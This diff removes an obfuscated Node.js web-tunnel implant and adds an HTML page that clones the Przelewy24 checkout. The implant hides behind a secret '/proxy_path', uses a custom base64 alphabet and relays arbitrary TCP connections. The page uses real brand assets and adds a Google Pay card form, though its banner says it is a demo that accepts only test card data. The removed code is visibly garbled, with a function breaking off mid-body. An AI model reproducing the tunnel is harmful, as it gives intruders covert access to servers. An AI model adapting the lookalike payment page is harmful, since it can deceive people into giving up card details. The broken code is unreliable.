@@ -1,150 +1,77 @@
-(async () => {
-  const path = '/proxy_path';
-
-  const http = await import('node:http');
-  const net = await import('node:net');
-
-  const DATA = 1;
-  const CMD = 2;
-  const MARK = 3;
-  const STATUS = 4;
-  const ERROR = 5;
-  const IP = 6;
-  const PORT = 7;
-  const REDIRECTURL = 8;
-  const FORCEREDIRECT = 9;
-
-  const en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-  const de = "dhULNVGsuAk/MxH6ibjcEfRqDWYznXBe9Pl7+SKoZ8pJaICgrQO0mF21yv345wtT";
-
-  const states = new Map();
-
-  function blv_decode(data) {
-    const info = {};
-    let i = 0;
-    while (i < data.length) {
-
-          let post_data = body;
-
-          const translated = strtr(post_data, de, en);
-          const decoded = Buffer.from(translated, 'base64');
-          let info;
-          try {
-            info = blv_decode(decoded);
-          } catch (e) {
-            res.writeHead(500);
-            res.end();
-            return;
-          }
-
-          let rinfo = {};
-          let sayhello = false;
-          const mark = info[MARK] ? info[MARK].toString() : null;
-          const cmd = info[CMD] ? info[CMD].toString() : null;
-
-          if (!cmd || !mark) {
-            sayhello = true;
-          } else {
-            switch (cmd) {
-              case "CONNECT": {
-                const target = info[IP] ? info[IP].toString() : null;
-                const port = info[PORT] ? parseInt(info[PORT].toString()) : null;
-                if (!target || !port) {
-                  rinfo[STATUS] = Buffer.from('FAIL');
-                  rinfo[ERROR] = Buffer.from('Missing IP or PORT');
-                  const output = blv_encode(rinfo);
-                  const base = output.toString('base64');
-                  const translated_out = strtr(base, en, de);
-                  res.end(translated_out);
-                  return;
-                }
-                const socket = net.createConnection({ port, host: target });
-                let connected = false;
-                socket.on('connect', () => {
-                  connected = true;
-                  const state = {
-                    run: true,
-                    writebuf: Buffer.alloc(0),
-                    readbuf: Buffer.alloc(0),
-                    socket,
-                  };
-                  states.set(mark, state);
-                  socket.on('data', data => {
-                    if (state.run) {
-                      state.readbuf = Buffer.concat([state.readbuf, data]);
-                      if (state.readbuf.length > 524288) {
-                        state.readbuf = state.readbuf.slice(state.readbuf.length - 524288);
-                  }
-                });
-                break;
-              }
-              case "DISCONNECT": {
-                const state = states.get(mark);
-                if (state) {
-                  state.run = false;
-                  state.socket.destroy();
-                }
-                const output = blv_encode(rinfo);
-                const base = output.toString('base64');
-                const translated_out = strtr(base, en, de);
-                res.end(translated_out);
-                break;
-              }
-              case "READ": {
-                const state = states.get(mark);
-                if (!state || !state.run) {
-                  rinfo[STATUS] = Buffer.from('FAIL');
-                  rinfo[ERROR] = Buffer.from('TCP session is closed');
-                } else {
-                  rinfo[STATUS] = Buffer.from('OK');
-                  rinfo[DATA] = state.readbuf;
-                  state.readbuf = Buffer.alloc(0);
-                  res.setHeader("Connection", "Keep-Alive");
-                }
-                const output = blv_encode(rinfo);
-                const base = output.toString('base64');
-                const translated_out = strtr(base, en, de);
-                res.end(translated_out);
-                break;
-              }
-              case "FORWARD": {
-                const state = states.get(mark);
-                if (!state || !state.run) {
-                  rinfo[STATUS] = Buffer.from('FAIL');
-                  rinfo[ERROR] = Buffer.from('TCP session is closed');
-                } else {
-                  const rawPostData = info[DATA] || Buffer.alloc(0);
-                  if (rawPostData.length > 0) {
-                    state.writebuf = Buffer.concat([state.writebuf, rawPostData]);
-                    rinfo[STATUS] = Buffer.from('OK');
-                    res.setHeader("Connection", "Keep-Alive");
-                  } else {
-                    rinfo[STATUS] = Buffer.from('FAIL');
-                    rinfo[ERROR] = Buffer.from('POST data parse error');
-                  }
-                }
-                const output = blv_encode(rinfo);
-                const base = output.toString('base64');
-                const translated_out = strtr(base, en, de);
-                res.end(translated_out);
-                break;
-              }
-              default:
-                sayhello = true;
-                break;
-            }
-          }
-
-          if (sayhello) {
-            const message = "6UNI/jhLR7X7fqPmY+m0BofOMNXNbVV2XNbiEVEODRxUbshHWKXC/mQWx0SNYVDFx1bKY0VDjcS3RcS/nGIOzVA0XOdI/cy=";
-            const translated_m = strtr(message, de, en);
-            const decoded_m = Buffer.from(translated_m, 'base64').toString();
-            res.end(decoded_m);
-          }
-        });
-        return true;
-      }
-    }
-    return originalEmit.apply(this, arguments);
-  };
-})();
+<!doctype html>
+<html lang="pl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>DEMO płatności | Baterm</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    :root{--red:#e30613;--ink:#1d2939;--muted:#667085;--line:#e4e7ec;--soft:#f3f4f6;--danger:#d92d20;--green:#12b76a;--p24-sprite:url('https://go.przelewy24.pl/sprite-common-5dba5c71f6.png')}
+    *{box-sizing:border-box}html,body{min-height:100%;margin:0}
+    body{font-family:Roboto,Arial,sans-serif;color:var(--ink);background:linear-gradient(rgba(7,15,23,.55),rgba(7,15,23,.55)),url('https://static.przelewy24.pl/img/background/default_background_50.webp') center/cover fixed no-repeat,#142434;display:grid;place-items:center;padding:18px 18px 58px}
+    button,input{font:inherit}button{color:inherit}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+    .demo-rail{position:fixed;z-index:90;top:10px;right:10px;max-width:min(350px,calc(100vw - 20px));background:#fff3cd;border:1px solid #f5c451;border-radius:999px;color:#694f00;text-align:center;padding:7px 12px;font-size:10px;line-height:1.25;font-weight:700;letter-spacing:.015em;box-shadow:0 3px 12px rgba(0,0,0,.14);pointer-events:none}
+    .shell{width:min(620px,100%);background:#fff;border-radius:7px;box-shadow:0 28px 80px rgba(0,0,0,.42);overflow:hidden}.topbar{height:51px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;border-bottom:1px solid var(--line)}
+    .brand{display:flex;align-items:center;gap:8px}.brand-logo{display:block;width:98px;height:33px;object-fit:contain}
+    .top-actions{display:flex;align-items:center;gap:15px;color:#344054}.top-actions time{font:500 14px/1 'Roboto Mono',monospace;letter-spacing:-.03em}.flag{display:block;width:25px;height:16px;border:1px solid #e4e7ec;border-radius:2px;object-fit:cover}.remote-icon{display:block;background-image:var(--p24-sprite);background-repeat:no-repeat;background-size:220px 184px}.eye-ui{width:18px;height:14px;background-position:-130px -115px}.menu-ui{width:18px;height:12px;background-position:-3px -141px}
+    .summary{display:flex;justify-content:space-between;align-items:end;padding:8px 16px 9px;border-bottom:1px solid var(--line)}.summary span{display:block;font-size:10px;font-weight:700;letter-spacing:.02em}.summary strong{font:700 18px/1.35 'Roboto Mono',monospace}.order{font:500 11px 'Roboto Mono',monospace}
+    .content{display:grid;grid-template-columns:180px 440px;min-height:534px;background:#fff}.methods{background:#f4f4f4;border-right:1px solid var(--line);padding:6px 4px}.method{position:relative;display:flex;align-items:center;justify-content:space-between;gap:8px;width:172px;min-height:56px;padding:0 12px;border:0;border-radius:8px;background:transparent;color:#283343;font-size:14px;font-weight:700;text-align:left;cursor:pointer}.method:hover{background:#fafafa}.method:focus{outline:none}.method.active{background:#fff;box-shadow:0 0 0 1px #1788d4}.method>img{display:block;flex:0 0 auto;object-fit:contain}.method[data-pane="card"]{min-height:56px;border-radius:11px}.method[data-pane="card"].active{box-shadow:0 0 0 4px #e5e7eb}.method-card{width:40px;height:40px}.method-standard{width:40px;height:40px}.method-installment{width:46px;height:17px}.method-name{display:block}
+    .panel{width:440px;padding:4px 18px 12px;overflow:hidden}.payment-pane{display:none;min-height:506px}.payment-pane.active{display:block}.click-row{width:368px;height:48px;display:flex;align-items:center;justify-content:space-between;padding:0 14px;border:1px solid var(--line);border-radius:9px;margin:0 auto 8px;background:#fff;font-size:14px;font-weight:500;color:#667085;cursor:pointer}.click-row:hover{border-color:#b8c0cc}.c2p-logo{width:96px;height:22px;object-fit:contain}
+    .card-box{position:relative;width:368px;margin:auto;border:1px solid var(--line);border-radius:10px;padding:15px 24px 13px;background:#fff}.card-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:13px;font-size:14px;font-weight:500}.card-head img{width:25px;height:20px;object-fit:contain}.field{position:relative;display:block;margin:0 0 8px}.field input{display:block;width:100%;height:58px;border:1px solid transparent;border-radius:9px;background:#f5f8fc;padding:0 24px;color:#101828;font-size:14px;outline:0;transition:.16s}.field input::placeholder{color:#667085;opacity:1}.field input:focus{background:#fff;border-color:#1788d4;box-shadow:0 0 0 1px #1788d4}.field input.valid{background:#fff;border-color:var(--green);box-shadow:0 0 0 1px var(--green)}.field input.invalid{background:#fff;border-color:var(--danger);box-shadow:0 0 0 1px var(--danger)}.field-error{display:none;margin:6px 12px 0;color:var(--danger);font-size:11px;line-height:1.2;font-style:normal}.field.invalid-wrap .field-error{display:block}.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}.row .field input{height:57px}.cvc-info{position:absolute;z-index:2;right:14px;top:19px;width:18px;height:18px}.error{min-height:0;margin:0;font-size:12px;color:var(--danger)}
+    .pay{width:100%;height:40px;border:0;border-radius:3px;background:#d0d0d0;color:#fff;font-weight:500;cursor:pointer;transition:.16s}.pay:hover{background:#bdbdbd}.pay img{width:14px;height:14px;margin-right:7px;vertical-align:-2px;filter:brightness(0) invert(1)}.pay.ready{background:var(--red)}.pay.ready:hover{background:#c5000c}.notice{margin-top:8px;border:1px solid #f5c451;background:#fff8df;color:#664d03;border-radius:6px;padding:6px 8px;font-size:10px;line-height:1.3}.status{display:none;margin:10px auto 0;width:368px;border:1px solid var(--green);background:#ecfdf3;color:#067647;border-radius:6px;padding:9px 10px;font-size:11px;line-height:1.35}.status.show{display:block}
+    .pane-inner{width:368px;margin:auto}.pane-title{display:flex;align-items:center;justify-content:space-between;height:48px;padding:0 14px;margin-bottom:8px;border:1px solid var(--line);border-radius:9px;background:#fff;font-size:14px;font-weight:500}.pane-title img{width:40px;height:40px;object-fit:contain}.pane-intro{margin:0 0 10px;color:#667085;font-size:12px;line-height:1.45}.option-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}.option{min-height:72px;display:flex;align-items:center;justify-content:center;padding:8px;border:1px solid var(--line);border-radius:8px;background:#fff;cursor:pointer;transition:.15s}.option:hover{border-color:#98a2b3}.option.selected{border-color:#1788d4;box-shadow:0 0 0 1px #1788d4}.option img{display:block;max-width:118px;max-height:42px}.wallet-card{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;min-height:218px;border:1px solid var(--line);border-radius:10px;background:#fff;padding:24px}.wallet-card>img{max-width:140px;max-height:58px}.demo-action{width:100%;height:44px;border:0;border-radius:4px;background:#111827;color:#fff;font-weight:500;cursor:pointer}.demo-action.red{background:var(--red)}.demo-action.apple{background:#000}.demo-action:hover{filter:brightness(.95)}.google-payment-layout{min-height:500px;display:flex;flex-direction:column}.google-open-row{width:100%;height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;border:1px solid var(--line);border-radius:10px;background:#fff;color:#111827;font-size:16px;cursor:pointer}.google-open-row:hover{border-color:#9ca3af}.google-open-row img{width:42px;height:28px;object-fit:contain}.google-payment-layout .banner{margin-top:auto}.banner{height:116px;margin-top:14px;border-radius:8px;background-position:center;background-size:cover}.banner.c2p{background-image:url('https://static.przelewy24.pl/nirvana/c2p-banner/img.webp')}.banner.blik{background-image:url('https://static.przelewy24.pl/nirvana/blik-banner-delayed/img.jpg')}.banner.xpay{background-image:url('https://static.przelewy24.pl/nirvana/xpay-banner/img.webp')}
+    .legal{padding:9px 16px;border-top:1px solid var(--line);font-size:10px;line-height:1.35;color:#475467}.legal b,.legal a{color:#111}.legal a{text-decoration:underline;cursor:pointer}.google-modal{position:fixed;z-index:60;inset:0;display:none;align-items:flex-start;justify-content:center;padding:0 16px 24px;background:rgba(16,24,40,.62)}.google-modal.open{display:flex}.google-sheet{width:min(610px,100%);height:min(602px,calc(100vh - 24px));border-radius:0 0 13px 13px;background:#fff;box-shadow:0 18px 60px rgba(0,0,0,.42);overflow:hidden}.google-sheet-head{position:relative;display:flex;align-items:center;justify-content:center;height:50px;border-bottom:1px solid #d9dce1;color:#111;font-size:13px}.google-close{position:absolute;right:14px;top:10px;width:28px;height:28px;border:2px solid #2f6fc3;border-radius:50%;background:#fff;color:#2f6fc3;font-size:19px;line-height:21px;cursor:pointer}.google-sheet-body{box-sizing:border-box;height:calc(100% - 50px);padding:20px 24px 24px;overflow-y:auto;scrollbar-gutter:stable}.google-back-title{display:flex;align-items:center;gap:14px;margin:0 0 34px;font-size:23px;font-weight:500}.google-back{display:inline-flex;align-items:center;justify-content:center;width:28px;height:32px;padding:0;border:0;background:transparent;color:#202124;font:400 31px/1 Arial,sans-serif;cursor:pointer}.google-back:hover{color:#0b57d0}.google-back:focus-visible{outline:2px solid #0b57d0;outline-offset:2px;border-radius:50%}.google-required{margin:0 0 18px;font-size:13px}.google-field{position:relative;display:block;margin:0 0 18px}.google-field input,.google-field select{box-sizing:border-box;width:100%;height:56px;padding:0 15px;border:1px solid #7f8790;border-radius:3px;background:#fff;color:#30343b;font-size:17px;outline:none}.google-field input:focus,.google-field select:focus{border:2px solid #1a73e8}.google-field small{display:none;margin-top:5px;color:#c5221f;font-size:12px}.google-field.invalid input,.google-field.invalid select{border:2px solid #c5221f}.google-field.invalid small{display:block}.google-two{display:grid;grid-template-columns:1fr 1fr;gap:24px}.google-floating{position:absolute;top:-8px;left:12px;padding:0 5px;background:#fff;color:#5f6368;font-size:12px}.google-terms{margin:20px 0 28px;color:#5f6368;font-size:12px;line-height:1.45}.google-confirm{width:100%;height:41px;border:0;border-radius:22px;background:#0b57d0;color:#fff;font-size:14px;font-weight:700;cursor:pointer}.google-confirm:hover{background:#0842a0}.cookie-bar{position:fixed;z-index:15;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:space-between;gap:16px;padding:9px 12px;background:#fff;border-top:1px solid #d0d5dd;color:#111;font-size:11px}.cookie-bar button{border:0;background:#1f2937;color:#fff;padding:8px 12px;font-weight:500;cursor:pointer}.cookie-bar.hidden{display:none}
+    @media(max-width:680px){body{padding:10px 10px 74px;display:block}.demo-rail{top:6px;right:6px;max-width:240px;font-size:9px;padding:5px 9px}.shell{margin:38px auto 0}.topbar{padding:0 12px}.brand-logo{width:88px}.summary{padding:10px 12px}.content{display:block;min-height:0}.methods{display:flex;width:100%;overflow:auto;border-right:0;border-bottom:1px solid var(--line);padding:8px}.method{min-width:160px;min-height:48px}.method:not(.active){display:none}.panel{width:100%;padding:10px}.payment-pane{min-height:0}.click-row,.card-box,.pane-inner,.status{width:100%}.row,.option-grid,.google-two{grid-template-columns:1fr}.google-payment-layout{min-height:430px}.google-modal{padding:0 8px 12px}.google-sheet{height:calc(100vh - 12px)}.google-sheet-body{padding:18px 16px}.legal{padding-left:12px;padding-right:12px}.cookie-bar{font-size:10px}}
+  </style>
+</head>
+<body>
+  <div class="demo-rail">DEMO — WYŁĄCZNIE DANE TESTOWE · NIE WPISUJ DANYCH PRAWDZIWEJ KARTY</div>
+  <main class="shell" aria-labelledby="page-title">
+    <h1 id="page-title" class="sr-only">Wybierz formę płatności</h1>
+    <header class="topbar"><div class="brand"><img class="brand-logo" src="https://static.przelewy24.pl/img/p24_logo/p24_logo.svg" alt="Przelewy24"></div><div class="top-actions"><time id="clock">--:--</time><span class="remote-icon eye-ui" role="img" aria-label="Zmiana koloru"></span><img class="flag" src="https://flagcdn.com/w40/pl.png" alt="Polski"><span class="remote-icon menu-ui" role="img" aria-label="Dodatkowe opcje"></span></div></header>
+    <section class="summary"><div><span>DO ZAPŁATY</span><strong id="orderAmount">24,00 PLN</strong></div><div class="order">BATERM</div></section>
+    <div class="content">
+      <nav class="methods" aria-label="Metody płatności">
+        <button class="method active" type="button" data-pane="card"><span class="method-name">Płatność kartą</span><img class="method-card" src="https://go.przelewy24.pl/payment-group-credit-card-version2-black-0a341cdfac.svg" alt="Visa i Mastercard"></button>
+        <button class="method" type="button" data-pane="transfer"><span>Przelewy</span><img class="method-standard" src="https://go.przelewy24.pl/payment-group-transfer-version2-black-6736f13ce3.svg" alt="Przelewy"></button>
+        <button class="method" type="button" data-pane="blik"><span>BLIK</span><img class="method-standard" src="https://go.przelewy24.pl/payment-group-blik-version2-black-e13752f759.svg" alt="BLIK"></button>
+        <button class="method" type="button" data-pane="visa"><span>Visa Mobile</span><img class="method-standard" src="https://go.przelewy24.pl/payment-group-merkury-version2-black-bde69cc8ba.svg" alt="Visa Mobile"></button>
+        <button class="method" type="button" data-pane="google"><span>Google Pay</span><img class="method-standard" src="https://go.przelewy24.pl/payment-group-google-pay-version2-black-f36e5bf78e.svg" alt="Google Pay"></button>
+        <button class="method" type="button" data-pane="apple"><span>Apple Pay</span><img class="method-standard" src="https://go.przelewy24.pl/payment-group-apple-pay-version2-black-607e0e7fbd.svg" alt="Apple Pay"></button>
+        <button class="method" type="button" data-pane="raty"><span>P24 RATY</span><img class="method-installment" src="https://go.przelewy24.pl/payment-group-installment-quick-version2-black-50364257e3.svg" alt="Przelewy24 Raty"></button>
+      </nav>
+      <section class="panel" aria-live="polite">
+        <section class="payment-pane active" data-pane-content="card">
+          <div class="card-box"><div class="card-head"><span>Wprowadź dane karty</span><img src="https://go.przelewy24.pl/card-icon-1872191f14.svg" alt="Karta"></div>
+            <label class="field"><span class="sr-only">Imię i nazwisko</span><input id="holder" type="text" autocomplete="off" spellcheck="false" placeholder="Imię i nazwisko *" maxlength="40"><small class="field-error">Pole wymagane</small></label>
+            <label class="field"><span class="sr-only">Numer karty</span><input id="number" type="text" inputmode="numeric" autocomplete="off" placeholder="Numer karty *" maxlength="19"><small class="field-error">Nieprawidłowy numer karty</small></label>
+            <div class="row"><label class="field"><span class="sr-only">Ważna do</span><input id="expiry" type="text" inputmode="numeric" autocomplete="off" placeholder="Ważna do *" maxlength="7"><small class="field-error">Nieprawidłowa data</small></label><label class="field"><span class="sr-only">CVV</span><input id="cvc" type="password" inputmode="numeric" autocomplete="off" placeholder="CVV *" maxlength="3"><img class="cvc-info" src="https://go.przelewy24.pl/info-2d9219e2d3.svg" alt="Informacja o CVV"><small class="field-error">Nieprawidłowy CVV</small></label></div>
+            <div id="error" class="error" role="alert"></div><button id="pay" class="pay" type="button" disabled><img src="https://go.przelewy24.pl/lock-126a3ef6c1.svg" alt=""><span id="payAmount">Płacę 24,00 PLN</span></button>
+          </div><div class="status" data-status="card"></div>
+        </section>
+        <section class="payment-pane" data-pane-content="transfer"><div class="pane-inner"><div class="pane-title"><span>Przelew online i tradycyjny</span><img src="https://go.przelewy24.pl/payment-group-transfer-version2-black-6736f13ce3.svg" alt="Przelewy"></div><p class="pane-intro">Wybierz bank.</p><div class="option-grid">
+          <button class="option demo-choice" type="button" data-choice="Bank PKO BP"><img src="https://go.przelewy24.pl/method-6-ff5b4f23b1.svg" alt="Bank PKO BP"></button><button class="option demo-choice" type="button" data-choice="Erste"><img src="https://go.przelewy24.pl/method-275-c4693a42bf.svg" alt="Erste"></button><button class="option demo-choice" type="button" data-choice="ING Bank Śląski"><img src="https://go.przelewy24.pl/method-271-e9e312a03f.svg" alt="ING Bank Śląski"></button><button class="option demo-choice" type="button" data-choice="Bank PEKAO"><img src="https://go.przelewy24.pl/method-65-7dfb2f360c.svg" alt="Bank PEKAO"></button><button class="option demo-choice" type="button" data-choice="Alior Bank"><img src="https://go.przelewy24.pl/method-88-2a4647ff95.svg" alt="Alior Bank"></button><button class="option demo-choice" type="button" data-choice="Inteligo"><img src="https://go.przelewy24.pl/method-2-24b34fe9bb.svg" alt="Inteligo"></button>
+        </div></div><div class="status" data-status="transfer"></div></section>
+        <section class="payment-pane" data-pane-content="blik"><div class="pane-inner"><div class="pane-title"><span>BLIK</span><img src="https://go.przelewy24.pl/payment-group-blik-version2-black-e13752f759.svg" alt="BLIK"></div><p class="pane-intro">Wybierz wariant BLIK.</p><div class="option-grid"><button class="option demo-choice" type="button" data-choice="BLIK"><img src="https://go.przelewy24.pl/method-154-6cdd2df8da.svg" alt="BLIK"></button><button class="option demo-choice" type="button" data-choice="BLIK Płacę Później"><img src="https://go.przelewy24.pl/method-298-8bb813ffa6.svg" alt="BLIK Płacę Później"></button></div></div><div class="banner blik" aria-hidden="true"></div><div class="status" data-status="blik"></div></section>
+        <section class="payment-pane" data-pane-content="visa"><div class="pane-inner"><div class="pane-title"><span>Visa Mobile</span><img src="https://go.przelewy24.pl/payment-group-merkury-version2-black-bde69cc8ba.svg" alt="Visa Mobile"></div><div class="wallet-card"><img src="https://go.przelewy24.pl/payment-group-merkury-version2-black-bde69cc8ba.svg" alt="Visa Mobile"><button class="demo-action red demo-choice" type="button" data-choice="Visa Mobile">Visa Mobile</button></div></div><div class="status" data-status="visa"></div></section>
+        <section class="payment-pane" data-pane-content="google"><div class="google-payment-layout"><button id="googleOpen" class="google-open-row" type="button"><span>Google Pay</span><img src="https://go.przelewy24.pl/payment-group-google-pay-version2-black-f36e5bf78e.svg" alt="Google Pay"></button><div class="banner xpay" aria-hidden="true"></div></div><div class="status" data-status="google"></div></section>
+        <section class="payment-pane" data-pane-content="apple"><div class="pane-inner"><div class="pane-title"><span>Apple Pay</span><img src="https://go.przelewy24.pl/payment-group-apple-pay-version2-black-607e0e7fbd.svg" alt="Apple Pay"></div><div class="wallet-card"><img src="https://go.przelewy24.pl/method-232-9f7be26a2a.svg" alt="Apple Pay"><button class="demo-action apple demo-choice" type="button" data-choice="Apple Pay">Apple Pay</button></div></div><div class="banner xpay" aria-hidden="true"></div><div class="status" data-status="apple"></div></section>
+        <section class="payment-pane" data-pane-content="raty"><div class="pane-inner"><div class="pane-title"><span>Raty i płatności odroczone</span><img src="https://go.przelewy24.pl/payment-group-installment-quick-version2-black-50364257e3.svg" alt="Przelewy24 Raty"></div><p class="pane-intro">Wybierz wariant.</p><div class="option-grid"><button class="option demo-choice" type="button" data-choice="Przelewy24 RATY"><img src="https://go.przelewy24.pl/payment-group-installment-quick-version2-black-50364257e3.svg" alt="Przelewy24 Raty"></button><button class="option demo-choice" type="button" data-choice="Płatność odroczona"><span>Płatność odroczona</span></button></div></div><div class="status" data-status="raty"></div></section>
+      </section>
+    </div>
+    <section class="legal">Płacąc akceptujesz <a href="#" data-demo-link>Regulamin Przelewy24</a><br>Administratorem Twoich danych osobowych jest spółka PayPro S.A. <a href="#" data-demo-link>Czytaj całość</a></section>
+  </main>
+  <div id="googleModal" class="google-modal" role="dialog" aria-modal="true" aria-labelledby="googleTitle" aria-hidden="true"><section class="google-sheet"><header class="google-sheet-head"><span>pay.google.com</span><button id="googleClose" class="google-close" type="button" aria-label="关闭">×</button></header><div class="google-sheet-body"><h2 id="googleTitle" class="google-back-title"><button id="googleBack" class="google-back" type="button" aria-label="返回">←</button><span>添加信用卡或借记卡</span></h2><p class="google-required">所有字段均为必填字段</p><label class="google-field"><input id="googleCard" type="text" inputmode="numeric" maxlength="19" autocomplete="off" placeholder="卡号"><small>请输入测试卡号</small></label><div class="google-two"><label class="google-field"><input id="googleExpiry" type="text" inputmode="numeric" maxlength="7" autocomplete="off" placeholder="MM/YY"><small>请输入有效日期</small></label><label class="google-field"><input id="googleCvc" type="password" inputmode="numeric" maxlength="3" autocomplete="off" placeholder="安全码"><small>请输入安全码</small></label></div><label class="google-field"><span class="google-floating">持卡人姓名</span><input id="googleHolder" type="text" maxlength="40" autocomplete="off" placeholder="持卡人姓名"><small>请输入持卡人姓名</small></label><label class="google-field"><span class="google-floating">国家/地区</span><select id="googleCountry"></select></label><label class="google-field"><input id="googlePostal" type="text" maxlength="12" autocomplete="off" placeholder="账单邮寄地址的邮政编码"><small>请输入邮政编码</small></label><p class="google-terms">继续操作即表示您将创建 Google Payments 账号，并同意遵守 Google Payments 服务条款。隐私权声明说明了处理您的数据的方式。</p><button id="googleConfirm" class="google-confirm" type="button">保存卡</button></div></section></div>
+  <div id="cookieBar" class="cookie-bar"><span>Serwis wykorzystuje pliki cookies zgodnie z <u>Polityką plików cookies</u>. Korzystanie ze strony oznacza zgodę na zapis lub wykorzystywanie.</span><button id="cookieOk" type="button">Rozumiem</button></div>
+  <script>
+    (()=>{'use strict';const VERIFIED_KEY='btm_v1', COMPLETION_COOKIE='btm_r1', SESSION_MS=15*60*1000, $=id=>document.getElementById(id),holder=$('holder'),number=$('number'),expiry=$('expiry'),cvc=$('cvc'),pay=$('pay'),error=$('error'),digits=v=>v.replace(/\D/g,'');let activePane='card',sessionExpired=false,countdownTimer=0;const query=new URLSearchParams(location.search),amount=(query.get('amount')||'').trim();if(amount){$('orderAmount').textContent=amount;$('payAmount').textContent='Płacę '+amount}
+      function hasCompletionCookie(){return document.cookie.split(';').some(item=>item.trim()===COMPLETION_COOKIE+'=1')}function setCompletionCookie(){document.cookie=COMPLETION_COOKIE+'=1; Max-Age=86400; Path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'')}function clearTestFields(){[holder,number,expiry,cvc,$('googleCard'),$('googleExpiry'),$('googleCvc'),$('googleHolder'),$('googlePostal')].forEach(el=>{if(el)el.value=''})}function closeGoogle(){const m=$('googleModal');m.classList.remove('open');m.setAttribute('aria-hidden','true')}function returnToCheckout(verified){clearInterval(countdownTimer);clearTestFields();closeGoogle();if(verified){setCompletionCookie();sessionStorage.setItem(VERIFIED_KEY,'1')}const sameOrigin=document.referrer&&new URL(document.referrer).origin===location.origin;if(sameOrigin&&history.length>1)history.back();else window.location.replace('/zamowienie')}function finishSession(){if(sessionExpired)return;sessionExpired=true;returnToCheckout(false)}function redirectThirdParty(){if(sessionExpired)return;returnToCheckout(true)}function openGoogle(){if(sessionExpired)return;const m=$('googleModal');m.classList.add('open');m.setAttribute('aria-hidden','false');$('googleCard').focus()}function showPane(name){if(sessionExpired)return;activePane=name;document.querySelectorAll('.method').forEach(x=>x.classList.toggle('active',x.dataset.pane===name));document.querySelectorAll('.payment-pane').forEach(x=>x.classList.toggle('active',x.dataset.paneContent===name))}if(hasCompletionCookie()){returnToCheckout(false);return}const sessionEndsAt=Date.now()+SESSION_MS,updateCountdown=()=>{const remaining=Math.max(0,sessionEndsAt-Date.now()),seconds=Math.ceil(remaining/1000);$('clock').textContent=String(Math.floor(seconds/60)).padStart(2,'0')+':'+String(seconds%60).padStart(2,'0');if(remaining<=0)finishSession()};updateCountdown();countdownTimer=setInterval(updateCountdown,250);const countryCodes='AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT BV BW BY BZ CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ TC TD TF TG TH TJ TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW'.split(' ');const displayNames=typeof Intl.DisplayNames==='function'?new Intl.DisplayNames(['zh-CN'],{type:'region'}):null;countryCodes.map(code=>({code,label:displayNames?displayNames.of(code):code})).sort((a,b)=>a.label.localeCompare(b.label,'zh-CN')).forEach(item=>{const option=document.createElement('option');option.value=item.code;option.textContent=item.label;$('googleCountry').appendChild(option)});$('googleCountry').value='US';document.querySelectorAll('.method').forEach(x=>x.addEventListener('click',()=>showPane(x.dataset.pane)));
+      number.addEventListener('input',()=>{number.value=digits(number.value).slice(0,16).replace(/(.{4})/g,'$1 ').trim();validate(false)});expiry.addEventListener('input',()=>{let d=digits(expiry.value).slice(0,4);expiry.value=d.length>2?d.slice(0,2)+' / '+d.slice(2):d;validate(false)});cvc.addEventListener('input',()=>{cvc.value=digits(cvc.value).slice(0,3);validate(false)});holder.addEventListener('input',()=>validate(false));
+      function checks(){const n=digits(number.value),e=digits(expiry.value),m=+e.slice(0,2),y=+('20'+e.slice(2)),now=new Date(),future=e.length===4&&m>=1&&m<=12&&(y>now.getFullYear()||(y===now.getFullYear()&&m>=now.getMonth()+1));return{holder:holder.value.trim().toUpperCase()==='TEST USER',number:n==='4242424242424242',expiry:future,cvc:cvc.value==='123'}}function validate(show){const c=checks(),ok=Object.values(c).every(Boolean);[[holder,c.holder],[number,c.number],[expiry,c.expiry],[cvc,c.cvc]].forEach(([el,v])=>{el.classList.toggle('valid',v);el.classList.toggle('invalid',show&&!v);el.closest('.field').classList.toggle('invalid-wrap',show&&!v)});pay.classList.toggle('ready',ok);pay.disabled=!ok;error.textContent='';return ok}[[holder,'holder'],[number,'number'],[expiry,'expiry'],[cvc,'cvc']].forEach(([el,key])=>el.addEventListener('blur',()=>{const ok=checks()[key];el.classList.toggle('invalid',!ok);el.closest('.field').classList.toggle('invalid-wrap',!ok)}));
